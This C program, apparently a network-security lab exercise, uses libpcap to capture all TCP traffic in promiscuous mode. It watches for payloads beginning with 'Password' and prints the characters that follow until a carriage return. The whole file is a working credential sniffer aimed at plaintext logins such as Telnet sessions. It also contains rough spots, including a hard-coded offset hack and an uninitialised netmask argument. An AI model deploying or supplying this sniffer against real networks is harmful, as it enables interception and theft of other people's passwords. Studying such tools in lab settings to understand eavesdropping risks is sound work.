#include <stdio.h>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <string.h>
int f=1;
void got_packet(
    u_char *args,
    const struct pcap_pkthdr *header,
    const u_char *packet
)
{
    /* chack that we've got ip packet */
    packet+=2;
struct ether_header *eth;
eth = (struct ether_header *) packet;
if (ntohs(eth->ether_type) != ETHERTYPE_IP) {
return;
}

    /* The total packet length, including all headers
       and the data payload is stored in
       header->len and header->caplen. Caplen is
       the amount actually available, and len is the
       total packet length even if it is larger
       than what we currently have captured. If the snapshot
       length set with pcap_open_live() is too small, you may
       not have the whole packet. */


/* Pointers to start point of various headers */
const u_char *tcp_h;
const u_char *ip_h;
const u_char *data;
int tcp_length;
int data_length;
int ip_length;
int ethernet_length = 14;/*all ways the same size*/
packet=packet;
ip_h = packet + ethernet_length;
/*ip header length*/
ip_length = ((*ip_h) & 0x0F);
ip_length = ip_length * 4;
/*chack if we got icmp msg*/
u_char p = *(ip_h + 9);
if (p != IPPROTO_TCP) {
return;
}

/*after that we sum the packet,ethernet_header_length, ip_header_length well know where is the tcp header is*/
tcp_h = packet + ethernet_length + ip_length;
/* we want to find the tcp header length ,we now where is the tcp header length stord.
becuse we want only the valur of the first half we mult the bits and shift them right */
tcp_length = ((*(tcp_h + 12)) & 0xF0) >> 4;
tcp_length = tcp_length * 4;
/* the sum according to the next line give us the pyload start*/
data = packet + ethernet_length+ip_length+tcp_length;
/* the sum according to the next line give us the length of the pyload*/
data_length = header->caplen-tcp_length-ethernet_length - ip_length;
   
  char * str ="Password";
    if(data_length > 0&&f){
    for(int i=0;i<strlen(str);i++){
    if(data_length<=i||str[i]!=data[i])
    return;
    }
     f=0;
    
    } 
    else if (data_length > 0&&!f) {
      for(int i=0;i<data_length;i++){
      	printf("%c",data[i]);
      	if(data[i]=='\r'){
      	f=1;
      	printf("\n");
      	}
      	}
    }
   

    return;
}


int main() {    
   pcap_t *handle;
  char buff[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  char filter[] = "tcp";
  bpf_u_int32 t;

  // Step 1: Open live pcap session on NIC with name eth3
  handle = pcap_open_live("any", BUFSIZ, 1, 1000, buff); 

  // Step 2: Compile filter_exp into BPF psuedo-code
  pcap_compile(handle, &fp, filter, 0, t);      
  pcap_setfilter(handle, &fp);                             

  // Step 3: Capture packets
  pcap_loop(handle, -1, got_packet, NULL);                

  pcap_close(handle);   //Close the handle 
  return 0;
}
